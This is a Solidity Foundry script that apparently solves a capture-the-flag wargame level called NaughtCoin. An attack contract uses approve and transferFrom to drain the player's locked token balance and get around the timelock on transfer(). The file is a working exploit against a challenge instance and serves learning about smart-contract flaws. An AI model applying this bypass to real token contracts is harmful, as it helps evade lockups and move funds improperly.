// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level15.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    NaughtCoin public instance =
        NaughtCoin(0x4850cbcf544F3055b6269C54C5e9bD1Ec0905EE2);
    function exploit(address _player) public {
        require(instance.allowance(_player, address(this))    > 0, "Not approved");
        require(
            instance.transferFrom(
                _player,
                address(this),
                instance.balanceOf(_player)
            ),
            "Transfer to attacker failed"
        );
    }
}

contract Level15Sol is Script {
    NaughtCoin public instance =
        NaughtCoin(0x4850cbcf544F3055b6269C54C5e9bD1Ec0905EE2);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address player = address(instance.player());
        uint playerBalance = instance.balanceOf(player);
        Attack attack = new Attack();
        instance.approve(address(attack), playerBalance); //approving attack contract and balance
        attack.exploit(player);

        vm.stopBroadcast();
    }
}
